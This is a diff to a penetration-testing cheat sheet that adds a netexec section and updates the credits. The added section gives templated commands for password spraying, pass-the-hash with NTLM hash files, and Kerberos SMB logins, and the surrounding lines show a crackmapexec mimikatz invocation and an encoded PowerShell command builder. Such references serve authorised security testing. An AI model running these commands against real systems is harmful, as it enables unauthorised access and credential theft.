@@ -1916,7 +1916,14 @@ crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privile
 cmedb #to launch the console
 help #run this command to view some others, running individual commands give infor on all the data till now we did.
 ```
-
+### netexec
+Similar to Crackmap it's archived <a href="https://www.netexec.wiki/getting-started/target-formats">Netexec wiki</a>
+```
+netexec <protocol> ~/targets.txt
+netexec <protocol> <target(s)> -u username1 -p password1 password2
+netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
+sudo nxc smb <TARGET> -k -u USER -p PASS
+```
 ### Pass the ticket
 
 ```powershell
@@ -2008,8 +2015,9 @@ cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decod
 print(cmdline)
 ```
 
-Special Thanks to Creator of tools and Community </br>
+# Special Thanks to the Creator of tools and Community
 [![](https://github.com/samratashok.png?size=50)](https://github.com/samratashok)
 [![](https://github.com/saisathvik1.png?size=50)](https://github.com/saisathvik1)
+[![](https://github.com/Pennyw0rth.png?size=50)](https://github.com/Pennyw0rth)
 
 ---
